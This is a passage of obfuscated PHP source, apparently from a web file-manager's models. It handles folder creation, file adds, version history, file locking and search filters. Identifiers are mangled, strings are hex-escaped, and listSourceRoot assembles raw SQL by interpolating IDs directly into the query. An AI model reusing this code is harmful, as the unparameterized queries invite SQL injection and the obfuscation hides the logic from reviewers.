count($›çø¢œ©) : 0; if ($—˜ŠÈäÜ > $ÀÈ€Ø¶) { return $this->_listSearchChildrenNear($óñ“‡Ø×, $ÀÈ€Ø¶); } $ƒî»¡ö = $this->field($Š—å¬²¶[180])->where($¨ÔÚà‘°)->select(); $”’«êâ© = array_to_keyvalue($ƒî»¡ö, $Š—å¬²¶[12], $Š—å¬²¶[180]); return $”’«êâ©; } private function _listSearchChildrenNear($óÛ¸Õà, $àÓ‚‡–ç) { $æà¬ÈÄ³ =& $_SERVER[™»È’øè]; $ÔÚ²³ÊŸ = array(); $ãÇ“Çç” = array($æà¬ÈÄ³[179] => $óÛ¸Õà); $â²£É¢ó = $this->field($æà¬ÈÄ³[2134])->where($ãÇ“Çç”)->select(); $›‰—è’“ = array_to_keyvalue(array_filter_by_field($â²£É¢ó, $æà¬ÈÄ³[452], $æà¬ÈÄ³[88]), $æà¬ÈÄ³[12], $æà¬ÈÄ³[180]); $ÔÚ²³ÊŸ = array_merge($ÔÚ²³ÊŸ, array_to_keyvalue($â²£É¢ó, $æà¬ÈÄ³[12], $æà¬ÈÄ³[180])); if (!$›‰—è’“) { return $ÔÚ²³ÊŸ; } $ãÇ“Çç” = array($æà¬ÈÄ³[179] => array($æà¬ÈÄ³[7], $›‰—è’“)); $â²£É¢ó = $this->field($æà¬ÈÄ³[2134])->where($ãÇ“Çç”)->limit($àÓ‚‡–ç)->select(); $ÔÚ²³ÊŸ = array_merge($ÔÚ²³ÊŸ, array_to_keyvalue($â²£É¢ó, $æà¬ÈÄ³[12], $æà¬ÈÄ³[180])); $ÔÚ²³ÊŸ = array_slice($ÔÚ²³ÊŸ, 0, $àÓ‚‡–ç); return $ÔÚ²³ÊŸ; } private function _listSearchBindPinyin($³‹ş†áë, &$Ù´“ıò, &$§ÄĞíĞ) { $†‡—É¬Ó =& $_SERVER[™»È’øè]; if (!isset($³‹ş†áë[$†‡—É¬Ó[1964]]) || !$³‹ş†áë[$†‡—É¬Ó[1964]]) { return; } if (!Input::check($³‹ş†áë[$†‡—É¬Ó[1964]], $†‡—É¬Ó[361]) || strlen($³‹ş†áë[$†‡—É¬Ó[1964]]) < 2) { return; } $Ô€ó±¶Æ = "\x4c\105\106\124\40\x4a\x4f\x49\116\40{$this->tablePrefix}\151\157\137\x73\157\x75\162\x63\145\x5f\x6d\x65\164\141\x20\x6d\x65\164\x61\x20\x6f\x6e\40\163\157\x75\162\143\x65\56\x73\157\x75\x72\x63\x65\x49\x44\x20\x3d\x20\155\x65\164\x61\56\163\157\165\162\143\145\111\104"; $¾éî»Ó» = array(); $§ÄĞíĞ = str_replace(array($†‡—É¬Ó[245], $†‡—É¬Ó[53], $†‡—É¬Ó[2135]), $†‡—É¬Ó[12], $§ÄĞíĞ); $§ÄĞíĞ = $†‡—É¬Ó[478] . str_replace($†‡—É¬Ó[50], $†‡—É¬Ó[479], $§ÄĞíĞ); $¡Ö†òñ = $Ù´“ıò[$†‡—É¬Ó[32]]; unset($Ù´“ıò[$†‡—É¬Ó[32]]); foreach ($Ù´“ıò as $ş¹ö½¼Ã => $ìÓüâúù) { $¾éî»Ó»[$†‡—É¬Ó[478] . $ş¹ö½¼Ã] = $ìÓüâúù; } foreach ($¡Ö†òñ as $«Õ‡¦öÍ) { $¾éî»Ó»[] = array($†‡—É¬Ó[483] => $«Õ‡¦öÍ, $†‡—É¬Ó[1030] => $†‡—É¬Ó[1968], array($†‡—É¬Ó[2136] => $«Õ‡¦öÍ, $†‡—É¬Ó[2137] => array($†‡—É¬Ó[7], array($†‡—É¬Ó[505], $†‡—É¬Ó[504])))); } $this->join($Ô€ó±¶Æ); $Ù´“ıò = $¾éî»Ó»; } private function _parseSearchWhere($‘…¾‡õ) { $¸‰äÂï™ =& $_SERVER[™»È’øè]; $Ê¸øÏÄˆ = array(); if (isset($‘…¾‡õ[$¸‰äÂï™[785]]) && $‘…¾‡õ[$¸‰äÂï™[785]]) { $Ê¸øÏÄˆ[$¸‰äÂï™[85]] = array($¸‰äÂï™[2138], $‘…¾‡õ[$¸‰äÂï™[785]]); } if (isset($‘…¾‡õ[$¸‰äÂï™[786]]) && $‘…¾‡õ[$¸‰äÂï™[786]]) { $¸Ø•¶Ü÷ = array($¸‰äÂï™[2139], $‘…¾‡õ[$¸‰äÂï™[786]]); if ($Ê¸øÏÄˆ[$¸‰äÂï™[85]]) { $Ê¸øÏÄˆ[$¸‰äÂï™[85]] = array($Ê¸øÏÄˆ[$¸‰äÂï™[85]], $¸Ø•¶Ü÷, $¸‰äÂï™[2140]); } else { $Ê¸øÏÄˆ[$¸‰äÂï™[85]] = $¸Ø•¶Ü÷; } } if (isset($‘…¾‡õ[$¸‰äÂï™[2132]]) && $‘…¾‡õ[$¸‰äÂï™[2132]] > 0) { $Ê¸øÏÄˆ[$¸‰äÂï™[76]] = array($¸‰äÂï™[2138], $‘…¾‡õ[$¸‰äÂï™[2132]]); } if (isset($‘…¾‡õ[$¸‰äÂï™[2133]]) && $‘…¾‡õ[$¸‰äÂï™[2133]]) { $¸Ø•¶Ü÷ = array($¸‰äÂï™[2139], $‘…¾‡õ[$¸‰äÂï™[2133]]); if ($Ê¸øÏÄˆ[$¸‰äÂï™[76]]) { $Ê¸øÏÄˆ[$¸‰äÂï™[76]] = array($Ê¸øÏÄˆ[$¸‰äÂï™[76]], $¸Ø•¶Ü÷, $¸‰äÂï™[2140]); } else { $Ê¸øÏÄˆ[$¸‰äÂï™[76]] = $¸Ø•¶Ü÷; } } if (isset($‘…¾‡õ[$¸‰äÂï™[629]]) && $‘…¾‡õ[$¸‰äÂï™[629]]) { $Ê¸øÏÄˆ[] = array($¸‰äÂï™[496] => $‘…¾‡õ[$¸‰äÂï™[629]], $¸‰äÂï™[494] => $‘…¾‡õ[$¸‰äÂï™[629]], $¸‰äÂï™[1030] => $¸‰äÂï™[1968]); } if (isset($‘…¾‡õ[$¸‰äÂï™[453]]) && $‘…¾‡õ[$¸‰äÂï™[453]]) { $ÊâÄÌ± = $‘…¾‡õ[$¸‰äÂï™[453]]; if ($ÊâÄÌ± == $¸‰äÂï™[75]) { $Ê¸øÏÄˆ[$¸‰äÂï™[452]] = 1; } else { if ($ÊâÄÌ± == $¸‰äÂï™[2141]) { $Ê¸øÏÄˆ[$¸‰äÂï™[452]] = 0; } else { if ($ÊâÄÌ±) { $ÊâÄÌ± = is_array($ÊâÄÌ±) ? $ÊâÄÌ± : explode($¸‰äÂï™[50], $ÊâÄÌ±); $Ê¸øÏÄˆ[$¸‰äÂï™[453]] = array($¸‰äÂï™[459], $ÊâÄÌ±); $Ê¸øÏÄˆ[$¸‰äÂï™[452]] = 0; } } } } $this->_parseSearchParent($‘…¾‡õ, $Ê¸øÏÄˆ); if (isset($‘…¾‡õ[$¸‰äÂï™[1964]]) && trim($‘…¾‡õ[$¸‰äÂï™[1964]])) { $•óï’ùº = trim($‘…¾‡õ[$¸‰äÂï™[1964]]); $äö©ÜÁÕ = explode($¸‰äÂï™[53], $•óï’ùº); if (strlen($•óï’ùº) > 2 && (substr($•óï’ùº, 0, 1) == $¸‰äÂï™[118] && substr($•óï’ùº, -1) == $¸‰äÂï™[118]) || substr($•óï’ùº, 0, 1) == $¸‰äÂï™[58] && substr($•óï’ùº, -1) == $¸‰äÂï™[58]) { $•óï’ùº = substr($•óï’ùº, 1, -1); $äö©ÜÁÕ = array($•óï’ùº); } $Ê¸øÏÄˆ[$¸‰äÂï™[32]] = array(array($¸‰äÂï™[579], $¸‰äÂï™[1966] . $•óï’ùº . $¸‰äÂï™[1966])); if (count($äö©ÜÁÕ) > 1) { $Ê¸øÏÄˆ[$¸‰äÂï™[32]] = array(); foreach ($äö©ÜÁÕ as $’šËû) { if (!trim($’šËû)) { continue; } $Ê¸øÏÄˆ[$¸‰äÂï™[32]][] = array($¸‰äÂï™[579], $¸‰äÂï™[1966] . trim($’šËû) . $¸‰äÂï™[1966]); } } } return $Ê¸øÏÄˆ; } private function _parseSearchParent($ØŞĞ»Û¨, &$ªğ¬Â•¤) { $Œ‚‡—‰¯ =& $_SERVER[™»È’øè]; if (!isset($ØŞĞ»Û¨[$Œ‚‡—‰¯[179]]) || !$ØŞĞ»Û¨[$Œ‚‡—‰¯[179]]) { return; } $¬‚äÎ·» = $this->pathInfo($ØŞĞ»Û¨[$Œ‚‡—‰¯[179]]); $Á¶ŠÈÆ· = $¬‚äÎ·»[$Œ‚‡—‰¯[179]] . $Œ‚‡—‰¯[12] === $Œ‚‡—‰¯[211]; $ìÄååÜü = $¬‚äÎ·»[$Œ‚‡—‰¯[177]] == $Œ‚‡—‰¯[546]; if ($¬‚äÎ·»[$Œ‚‡—‰¯[563]] == $Œ‚‡—‰¯[564]) { $˜•È±Ãü = $this->sourceInfo($ØŞĞ»Û¨[$Œ‚‡—‰¯[179]]); $¬‚äÎ·»[$Œ‚‡—‰¯[552]] = $˜•È±Ãü[$Œ‚‡—‰¯[552]]; } $ªğ¬Â•¤[$Œ‚‡—‰¯[619]] = array($Œ‚‡—‰¯[579], $¬‚äÎ·»[$Œ‚‡—‰¯[552]] . $ØŞĞ»Û¨[$Œ‚‡—‰¯[179]] . $Œ‚‡—‰¯[580]); $Øş•úÚƒ = isset($ØŞĞ»Û¨[$Œ‚‡—‰¯[1829]]) && in_array($Œ‚‡—‰¯[546], $ØŞĞ»Û¨[$Œ‚‡—‰¯[1829]]); if (!$Øş•úÚƒ || !$ìÄååÜü || !$Á¶ŠÈÆ· || !$¬‚äÎ·»[$Œ‚‡—‰¯[454]]) { return; } if (!AuthModel::authCheckRoot($¬‚äÎ·»[$Œ‚‡—‰¯[454]][$Œ‚‡—‰¯[455]])) { return; } $¿‹»Âİü = $¬‚äÎ·»[$Œ‚‡—‰¯[537]] . $Œ‚‡—‰¯[12]; if ($¿‹»Âİü == $Œ‚‡—‰¯[88]) { unset($ªğ¬Â•¤[$Œ‚‡—‰¯[619]]); $ªğ¬Â•¤[$Œ‚‡—‰¯[177]] = self::TYPE_GROUP; return; } $ùé¨ŞÈ = Model($Œ‚‡—‰¯[553])->groupChildrenAll($¿‹»Âİü); $ÍÂ‡îĞ = count($ùé¨ŞÈ); if ($ÍÂ‡îĞ <= 1) { return; } $áÓØ‡¡¥ = array($Œ‚‡—‰¯[179] => 0, $Œ‚‡—‰¯[177] => self::TYPE_GROUP, $Œ‚‡—‰¯[537] => array($Œ‚‡—‰¯[7], $ùé¨ŞÈ)); $§Ç¼Â‡Î = $this->field($Œ‚‡—‰¯[2142])->where($áÓØ‡¡¥)->limit($ÍÂ‡îĞ)->select(); $ªğ¬Â•¤[$Œ‚‡—‰¯[619]] = array(); foreach ($§Ç¼Â‡Î as $óÔçí…È) { $ªğ¬Â•¤[$Œ‚‡—‰¯[619]][] = array($Œ‚‡—‰¯[579], $Œ‚‡—‰¯[562] . $óÔçí…È[$Œ‚‡—‰¯[180]] . $Œ‚‡—‰¯[580]); } $ªğ¬Â•¤[$Œ‚‡—‰¯[619]][] = $Œ‚‡—‰¯[1968]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($ùô¨Ñç­) { $“¾ÖÊù =& $_SERVER[™»È’øè]; $š¢²Ùæ„ = Model($“¾ÖÊù[545])->where(array($“¾ÖÊù[1669] => $ùô¨Ñç­))->find(); $ñÉøµø = $this->_mkdirRoot(SourceModel::TYPE_USER, $ùô¨Ñç­, $š¢²Ùæ„[$“¾ÖÊù[32]]); $this->userDesktopAdd($ñÉøµø); return $ñÉøµø; } public function userDesktopAdd($òô…‘Çª) { $¹—ÒŒŒĞ =& $_SERVER[™»È’øè]; $ïÓ¯Ş˜Ï = LNG($¹—ÒŒŒĞ[2143]); $Ïğ÷íÀ‹ = $this->mkdir($òô…‘Çª, $ïÓ¯Ş˜Ï); $this->metaSet($Ïğ÷íÀ‹, $¹—ÒŒŒĞ[2144], $¹—ÒŒŒĞ[88]); $this->metaSet($òô…‘Çª, $¹—ÒŒŒĞ[2145], $Ïğ÷íÀ‹); } public function userPathSafeAdd($Õûá™é) { $³ù–ş—£ =& $_SERVER[™»È’øè]; $Ï¾·µäÑ = Model($³ù–ş—£[545])->getInfoFull($Õûá™é); if (!$Ï¾·µäÑ) { return !1; } if (_get($Ï¾·µäÑ, $³ù–ş—£[567])) { return $Ï¾·µäÑ[$³ù–ş—£[506]][$³ù–ş—£[2146]]; } $ä¯ªÊªâ = $this->_mkdirRoot(SourceModel::TYPE_USER, $Õûá™é, $³ù–ş—£[2147], $³ù–ş—£[473]); Model($³ù–ş—£[545])->metaSet($Õûá™é, $³ù–ş—£[2146], $ä¯ªÊªâ); $this->metaSet($ä¯ªÊªâ, $³ù–ş—£[2148], $Õûá™é); return $ä¯ªÊªâ; } public function groupRootAdd($ÊşâÇÑ) { $İ÷˜ü€ì =& $_SERVER[™»È’øè]; $ïÖúçÊ‚ = Model($İ÷˜ü€ì[553])->where(array($İ÷˜ü€ì[1958] => $ÊşâÇÑ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ÊşâÇÑ, $ïÖúçÊ‚[$İ÷˜ü€ì[32]]); } public function systemRootPathAdd($ÛÓÅ¢‰¡) { if ($ÛÓÅ¢‰¡ != $_SERVER[™»È’øè][573]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $ÛÓÅ¢‰¡); } public function userRootRemove($¹ÓÎİŒÄ) { $‰Ï§¯½Ó = $this->targetSourceRoot(SourceModel::TYPE_USER, $¹ÓÎİŒÄ, !0); foreach ($‰Ï§¯½Ó as $ÂÆŸëÏ ) { if (!$ÂÆŸëÏ ) { continue; } $this->remove($ÂÆŸëÏ [$_SERVER[™»È’øè][180]], !1); } } public function groupRootRemove($¢ÕÇÆıÔ) { $ñÛ¨¸‘ù = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $¢ÕÇÆıÔ); if (!$ñÛ¨¸‘ù) { return; } $this->remove($ñÛ¨¸‘ù[$_SERVER[™»È’øè][180]], !1); } private function _mkdirRoot($¹Ã®Ò°, $Ö ™ÜÆ, $ù×ëĞ, $ŒË±ç—Ñ = '') { $¤à™›‡¸ =& $_SERVER[™»È’øè]; $Ş¡Û²ÃÔ = defined($¤à™›‡¸[2091]) ? USER_ID : 0; $›¶¦œ¼Û = array($¤à™›‡¸[444] => 0, $¤à™›‡¸[615] => $¹Ã®Ò°, $¤à™›‡¸[616] => $Ö ™ÜÆ, $¤à™›‡¸[613] => 1, $¤à™›‡¸[617] => $Ş¡Û²ÃÔ, $¤à™›‡¸[618] => $Ş¡Û²ÃÔ, $¤à™›‡¸[614] => $ŒË±ç—Ñ, $¤à™›‡¸[619] => $¤à™›‡¸[562], $¤à™›‡¸[471] => 0, $¤à™›‡¸[584] => 0, $¤à™›‡¸[509] => 0, $¤à™›‡¸[620] => $¤à™›‡¸[12]); if ($Ì²†…ñ = $this->where($›¶¦œ¼Û)->find()) { return $Ì²†…ñ[$¤à™›‡¸[180]]; } $Üê„Ë­Ê = "\115\x6f\x64\145\154\x53\x6f\x75\x72\143\x65\x2e\x6d\153\144\151\162\122\157\157\x74\x2e{$¹Ã®Ò°}\x2e{$Ö ™ÜÆ}\x2e" . $ù×ëĞ; CacheLock::lock($Üê„Ë­Ê); $›¶¦œ¼Û[$¤à™›‡¸[32]] = $ù×ëĞ; $°¦ÑÂ‰Ì = $this->add($›¶¦œ¼Û); $µÀÒñî = array($¤à™›‡¸[621] => short_id($°¦ÑÂ‰Ì)); $this->where(array($¤à™›‡¸[458] => $°¦ÑÂ‰Ì))->save($µÀÒñî); CacheLock::unlock($Üê„Ë­Ê); return $°¦ÑÂ‰Ì; } private function targetSourceRoot($åİÔÁ×, $©ÛÜ¡Ñ, $Å¨ºÍªï = false) { $°ø¶”§– =& $_SERVER[™»È’øè]; $¯ÜòÒ°ñ = array($°ø¶”§–[444] => 0, $°ø¶”§–[615] => $åİÔÁ×, $°ø¶”§–[616] => $©ÛÜ¡Ñ); if ($Å¨ºÍªï) { $Ğ£ÆÖë° = $this->where($¯ÜòÒ°ñ)->select(); return $Ğ£ÆÖë° ? $Ğ£ÆÖë° : array(); } $¯¤ˆœ¸ = $this->where($¯ÜòÒ°ñ)->find(); return $¯¤ˆœ¸ ? $¯¤ˆœ¸ : array(); } public function sourceRootGroup($ù™ìßÃ¯) { $”ÜËÕèî =& $_SERVER[™»È’øè]; if (is_string($ù™ìßÃ¯)) { $ù™ìßÃ¯ = array($ù™ìßÃ¯); } $µïÊµ˜§ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $ù™ìßÃ¯, $”ÜËÕèî[202]); $ä­ÆÔğ = array($”ÜËÕèî[412] => $µïÊµ˜§, $”ÜËÕèî[409] => array($”ÜËÕèî[783] => count($ù™ìßÃ¯))); $this->_listDataApply($ä­ÆÔğ[$”ÜËÕèî[412]]); $this->_listMake($ä­ÆÔğ); return array_to_keyvalue($ä­ÆÔğ[$”ÜËÕèî[82]], $”ÜËÕèî[537]); } public function mkfile($ıó×ùàî, $‹¾Ìùñº, $û®•Å§³ = '', $Êë››Õ³ = REPEAT_RENAME) { $óåõ‘ëÊ =& $_SERVER[™»È’øè]; $¹ßş»³÷ = Model($óåõ‘ëÊ[642])->addFileByContent($û®•Å§³, $‹¾Ìùñº); return $this->_createFileCall($ıó×ùàî, $‹¾Ìùñº, $¹ßş»³÷, $Êë››Õ³, $óåõ‘ëÊ[1372]); } public function addFile($Ô£¶“Æâ, $Ë§™óÄ¯, $ÃÃ’ØúÉ, $›ŸºÓ‹û = false, $ß”·Âí = REPEAT_RENAME) { $¶àÜöô = Model($_SERVER[™»È’øè][642])->addFile($Ë§™óÄ¯, $ÃÃ’ØúÉ, $›ŸºÓ‹û); return $this->_createFileCall($Ô£¶“Æâ, $ÃÃ’ØúÉ, $¶àÜöô, $ß”·Âí); } public function addFileByFileID($¿¯¹í×, $Ş¬ãû´´, $’½íÇî–, $®ÕÃ±ÇÓ = REPEAT_RENAME) { $õÑ€Ãİò =& $_SERVER[™»È’øè]; $ƒ©¿ –æ = Model($õÑ€Ãİò[642])->find($Ş¬ãû´´); Model($õÑ€Ãİò[642])->linkAdd($Ş¬ãû´´); return $this->_createFileCall($¿¯¹í×, $’½íÇî–, $ƒ©¿ –æ, $®ÕÃ±ÇÓ); } public function addFileByRemote($š¬ÌÒÑ±, $ÇâïÃ¿¢, $¢ìÈµÃ², $çÙÒı÷ = array(), $‡Ãˆäòí = REPEAT_RENAME) { $±°İÚÛ§ = Model($_SERVER[™»È’øè][642])->addFileByRemote($ÇâïÃ¿¢, $¢ìÈµÃ², $çÙÒı÷); return $this->_createFileCall($š¬ÌÒÑ±, $¢ìÈµÃ², $±°İÚÛ§, $‡Ãˆäòí); } private function _createFileCall($ëéµÆğ, $Â´ù¦ÒÃ, $§Ñ¨”¶, $„ªê³óò, $ƒòïòË† = "\x75\x70\x6c\157\141\x64") { $´ßô¢¡È =& $_SERVER[™»È’øè]; $úã‚î—Ê = !1; $this->setMasterDB(); $this->lockWriteStart($ëéµÆğ, $Â´ù¦ÒÃ); $‘Ç•ªÛ = $this->fileNameExist($ëéµÆğ, $Â´ù¦ÒÃ); $¶ù¬÷û„ = $this->_createFile($ëéµÆğ, $Â´ù¦ÒÃ, $§Ñ¨”¶, $„ªê³óò, $úã‚î—Ê); if (!$úã‚î—Ê) { Model($´ßô¢¡È[511])->remove($§Ñ¨”¶[$´ßô¢¡È[508]]); } if ($úã‚î—Ê && $¶ù¬÷û„ && $¶ù¬÷û„ != $‘Ç•ªÛ) { Model($´ßô¢¡È[2116])->eventCreate($¶ù¬÷û„, $ƒòïòË†); } $this->lockWriteEnd($ëéµÆğ, $Â´ù¦ÒÃ); return $¶ù¬÷û„; } public function mkdir($ÍÌï’ùÙ, $”á·ì¹ö, $ßÏøŞÕí = REPEAT_SKIP) { $À¤»€   =& $_SERVER[™»È’øè]; $this->setMasterDB(); $ÆšÆÔÓÕ = $this->sourceInfo($ÍÌï’ùÙ); if (!$ÆšÆÔÓÕ) { return !1; } $this->lockWriteStart($ÍÌï’ùÙ, $”á·ì¹ö); if ($ßÏøŞÕí !== !1) { $îú€’³ö = $this->fileNameExist($ÍÌï’ùÙ, $”á·ì¹ö); if ($îú€’³ö && $ßÏøŞÕí != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($ÍÌï’ùÙ, $”á·ì¹ö); return $îú€’³ö; } $”á·ì¹ö = $this->fileNameAuto($ÍÌï’ùÙ, $”á·ì¹ö, $ßÏøŞÕí); } $¬úµ¶‰€ = array($À¤»€  [613] => 1, $À¤»€  [461] => $”á·ì¹ö, $À¤»€  [614] => $À¤»€  [12], $À¤»€  [509] => 0, $À¤»€  [584] => 0); $ÒÌº’ñØ = $this->_addSource($¬úµ¶‰€, $ÆšÆÔÓÕ); Model($À¤»€  [2116])->eventCreate($ÒÌº’ñØ, $À¤»€  [1373]); $this->lockWriteEnd($ÍÌï’ùÙ, $”á·ì¹ö); return $ÒÌº’ñØ; } public function listSourceRoot($ĞÈ©˜Š­, $«½û¼µö, $¦üªº¼ = "\x73\x6f\165\162\143\145\111\x44\54\164\x61\162\x67\x65\x74\x49\x44\54\163\151\x7a\145") { $è”èúâË =& $_SERVER[™»È’øè]; $çåÛŞ¼¥ = $è”èúâË[421]; $±‘°“ƒÕ = array(); $¤ÕşÄêÄ = 1024 * 50; $İ³¨©ïÊ = is_array($İ³¨©ïÊ) ? $İ³¨©ïÊ : array(); $ìĞôØíÀ = count($«½û¼µö); $³ƒË­ÎŞ = $this->tablePrefix . $è”èúâË[2149]; for ($–á‡‡Ìœ = 0; $–á‡‡Ìœ < $ìĞôØíÀ; $–á‡‡Ìœ++) { $ÔØĞØ = $«½û¼µö[$–á‡‡Ìœ]; $çåÛŞ¼¥ .= "\x53\x45\114\x45\x43\124\40\x2a\x20\106\x52\117\x4d\x20\x28\123\x45\x4c\x45\x43\124\40{$¦üªº¼}\40\106\x52\117\115\x20\140{$³ƒË­ÎŞ}\x60\x20\127\x48\x45\x52\105\40"; $çåÛŞ¼¥ .= "\x60\160\141\162\145\x6e\x74\x49\104\140\75\60\40\101\116\x44\40\x60\x74\x61\x72\x67\x65\x74\111\x44\x60\75{$ÔØĞØ}\40\101\116\104\40\x60\164\x61\162\147\145\x74\124\171\x70\145\x60\75{$ĞÈ©˜Š­}\x20\141\x6e\144\40\x66\x69\x6c\145\124\171\160\x65\75\47\47\40\x6c\x69\x6d\x69\x74\40\x31\51\x20\x61\x73\40\164\x62\137{$–á‡‡Ìœ}\40\125\116\x49\117\x4e\40\x41\x4c\114\x20"; if ((strlen($çåÛŞ¼¥) >= $¤ÕşÄêÄ || $–á‡‡Ìœ == $ìĞôØíÀ - 1) && $çåÛŞ¼¥) { $çåÛŞ¼¥ = substr($çåÛŞ¼¥, 0, -strlen($è”èúâË[1068])); $ê˜Šé“ = $this->query($çåÛŞ¼¥); $çåÛŞ¼¥ = $è”èúâË[12]; $±‘°“ƒÕ = array_merge($±‘°“ƒÕ, $ê˜Šé“); } } return $±‘°“ƒÕ; } private function _createFile($ïşÙ»·ã, $ÍÀ¶ûşŸ, $‡‡ÇùŸˆ, $¦ÈàÙÀè, &$ŒƒÖœ ı) { $Œ™†¢Ã– =& $_SERVER[™»È’øè]; $±ı²×âí = $this->sourceInfo($ïşÙ»·ã); if (!$‡‡ÇùŸˆ || !$±ı²×âí) { return !1; } if ($¦ÈàÙÀè !== !1) { $ĞÅ·´˜¯ = $this->fileNameExist($ïşÙ»·ã, $ÍÀ¶ûşŸ); } $ŒƒÖœ ı = !0; if ($¦ÈàÙÀè && $ĞÅ·´˜¯) { if ($¦ÈàÙÀè == REPEAT_SKIP) { $ŒƒÖœ ı = !1; return $ĞÅ·´˜¯; } else { if ($¦ÈàÙÀè == REPEAT_REPLACE) { $»ñ£Úºª = $this->sourceInfo($ĞÅ·´˜¯); $õÚŸËŸ = $this->fileHistory($»ñ£Úºª, $‡‡ÇùŸˆ[$Œ™†¢Ã–[508]], $‡‡ÇùŸˆ[$Œ™†¢Ã–[76]]); if (!$õÚŸËŸ) { $ŒƒÖœ ı = !1; } else { $this->folderSizeReset($ïşÙ»·ã); } return $ĞÅ·´˜¯; } else { $ÍÀ¶ûşŸ = $this->fileNameAuto($ïşÙ»·ã, $ÍÀ¶ûşŸ, $¦ÈàÙÀè, !1); } } } $Ğ£¤ùÒò = array($Œ™†¢Ã–[613] => 0, $Œ™†¢Ã–[461] => $ÍÀ¶ûşŸ, $Œ™†¢Ã–[614] => substr(get_path_ext($ÍÀ¶ûşŸ), 0, 10), $Œ™†¢Ã–[509] => $‡‡ÇùŸˆ[$Œ™†¢Ã–[508]], $Œ™†¢Ã–[584] => $‡‡ÇùŸˆ[$Œ™†¢Ã–[76]]); $Ùáàå÷ú = $this->_addSource($Ğ£¤ùÒò, $±ı²×âí); $this->folderSizeReset($ïşÙ»·ã, intval($Ğ£¤ùÒò[$Œ™†¢Ã–[76]])); return $Ùáàå÷ú; } protected function fileHistory($¥Æ‰¬ù, $’ÖëÈëÓ, $õ¯‡Éø£) { $–åü™ =& $_SERVER[™»È’øè]; if ($¥Æ‰¬ù[$–åü™[508]] == $’ÖëÈëÓ) { return !1; } $this->checkLock($¥Æ‰¬ù[$–åü™[180]], $’ÖëÈëÓ); Model($–åü™[2150])->addHistory($¥Æ‰¬ù); $È¼ˆòì = array($–åü™[618] => USER_ID, $–åü™[465] => time(), $–åü™[508] => $’ÖëÈëÓ, $–åü™[76] => $õ¯‡Éø£); $this->where(array($–åü™[458] => $¥Æ‰¬ù[$–åü™[180]]))->save($È¼ˆòì); $this->sourceCacheClear($¥Æ‰¬ù[$–åü™[180]]); return !0; } public function checkLock($ŠêúäÅ, $Ÿ­¼‡ò¹) { $å£úµ‚õ =& $_SERVER[™»È’øè]; $»×ª¥º  = $this->pathInfo($ŠêúäÅ); if (!$this->fileIsLock($»×ª¥º , !0)) { return; } $—ó›şóà = Session::get($å£úµ‚õ[2151]); $ßå¾Š‡Å = substr($»×ª¥º [$å£úµ‚õ[32]], 0, -1 - strlen($»×ª¥º [$å£úµ‚õ[174]])) . $å£úµ‚õ[1238] . $—ó›şóà . $å£úµ‚õ[10] . $»×ª¥º [$å£úµ‚õ[174]]; $Œâ£Å‚î = Model($å£úµ‚õ[642])->find($Ÿ­¼‡ò¹); $this->_createFileCall($»×ª¥º [$å£úµ‚õ[179]], $ßå¾Š‡Å, $Œâ£Å‚î, REPEAT_REPLACE, $å£úµ‚õ[1372]); $¬äà¦Õ¸ = $»×ª¥º [$å£úµ‚õ[506]][$å£úµ‚õ[577]]; $Äª¢üÎÁ = $¬äà¦Õ¸[$å£úµ‚õ[2152]] ? $¬äà¦Õ¸[$å£úµ‚õ[2152]] : $¬äà¦Õ¸[$å£úµ‚õ[32]]; show_json(LNG($å£úµ‚õ[2153]) . $å£úµ‚õ[2154] . LNG($å£úµ‚õ[2155]) . $å£úµ‚õ[2156] . $Äª¢üÎÁ . $å£úµ‚õ[2157], !1); } public function fileIsLock($ÚıÈŞ ½, $›™ÌáòÄ = false) { $¢¢—©«£ =& $_SERVER[™»È’øè]; if (!isset($ÚıÈŞ ½[$¢¢—©«£[506]]) || !$ÚıÈŞ ½[$¢¢—©«£[506]][$¢¢—©«£[574]]) { return !1; } if ($ÚıÈŞ ½[$¢¢—©«£[506]][$¢¢—©«£[574]] != USER_ID) { return !0; } $Š›ßãı³ = $GLOBALS[$¢¢—©«£[6]][$¢¢—©«£[89]][$¢¢—©«£[575]]; if ($ÚıÈŞ ½[$¢¢—©«£[506]][$¢¢—©«£[576]] <= time() - $Š›ßãı³) { $this->metaSet($ÚıÈŞ ½[$¢¢—©«£[180]], $¢¢—©«£[574], null); $this->metaSet($ÚıÈŞ ½[$¢¢—©«£[180]], $¢¢—©«£[576], null); } if ($›™ÌáòÄ) { $this->metaSet($ÚıÈŞ ½[$¢¢—©«£[180]], $¢¢—©«£[576], time()); } return !1; } private function _addSource($¥Â³ş’—, $ğğË‘­™) { $˜‚¯‹ÜÉ =& $_SERVER[™»È’øè]; $™ı½ü’ = defined($˜‚¯‹ÜÉ[2091]) ? USER_ID : 0; $Íù‘É™ü = array($˜‚¯‹ÜÉ[615] => $ğğË‘­™[$˜‚¯‹ÜÉ[177]], $˜‚¯‹ÜÉ[616] => $ğğË‘­™[$˜‚¯‹ÜÉ[537]], $˜‚¯‹ÜÉ[617] => $™ı½ü’, $˜‚¯‹ÜÉ[618] => $™ı½ü’, $˜‚¯‹ÜÉ[444] => $ğğË‘­™[$˜‚¯‹ÜÉ[180]], $˜‚¯‹ÜÉ[619] => $ğğË‘­™[$˜‚¯‹ÜÉ[552]] . $ğğË‘­™[$˜‚¯‹ÜÉ[180]] . $˜‚¯‹ÜÉ[50], $˜‚¯‹ÜÉ[471] => 0, $˜‚¯‹ÜÉ[620] => $˜‚¯‹ÜÉ[12]); $¥Â³ş’— = array_merge($Íù‘É™ü, $¥Â³ş’—); $this->updateModifyTime($¥Â³ş’—[$˜‚¯‹ÜÉ[179]]); $ãÀ¢å¿ = $˜‚¯‹ÜÉ[2158] . $ğğË‘­™[$˜‚¯‹ÜÉ[180]]; if (isset(self::$cacheChildList[$ãÀ¢å¿])) { unset(self::$cacheChildList[$ãÀ¢å¿]); } static $ ˜±“ù® = false; if (!$ ˜±“ù®) { Hook::trigger($˜‚¯‹ÜÉ[603], $¥Â³ş’—); $ ˜±“ù® = !0; } $íòªƒ­ç = $this->add($¥Â³ş’—); $‹ƒÕÂˆÂ = array($˜‚¯‹ÜÉ[621] => short_id($íòªƒ­ç)); $this->where(array($˜‚¯‹ÜÉ[458] => $íòªƒ­ç))->save($‹ƒÕÂˆÂ); 